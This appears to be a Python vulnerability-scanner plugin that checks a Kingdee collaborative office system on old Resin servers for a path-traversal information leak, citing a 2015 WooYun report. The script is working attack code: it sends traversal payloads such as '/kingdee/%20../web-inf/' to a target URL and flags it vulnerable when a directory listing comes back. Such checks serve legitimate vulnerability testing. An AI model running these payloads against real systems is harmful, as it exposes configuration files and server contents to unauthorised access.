#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 金蝶协同平台远程信息泄露漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0126353
author: Lucifer
description: 金蝶协同办公系统基于resin引用了漏洞组件导致远程信息泄露。
            受影响系统：
            Caucho Technology Resin v3.1.0 for Windows
            Caucho Technology Resin v3.0.21 for Windows
            Caucho Technology Resin v3.0.20 for Windows
            Caucho Technology Resin v3.0.19 for Windows
            Caucho Technology Resin v3.0.18 for Windows
            Caucho Technology Resin v3.0.17 for Windows
            Caucho Technology Resin Professional v3.1.0 for Window
'''
import sys
import requests
import warnings
def run(url):
        result = ['金蝶协同平台远程信息泄露漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ["/kingdee/%20../web-inf/", "/kingdee/%20../editor/", "/kingdee/%20../disk/"]
        for payload in payloads:
            vulnurl = url + payload
            try:
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

                if r"Directory" in req.text:
                    result[2]=  '存在'
                    result[1] = vulnurl
                    return result
            except:
                result[2]='不存在'
                return result
        result[2]=  '不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    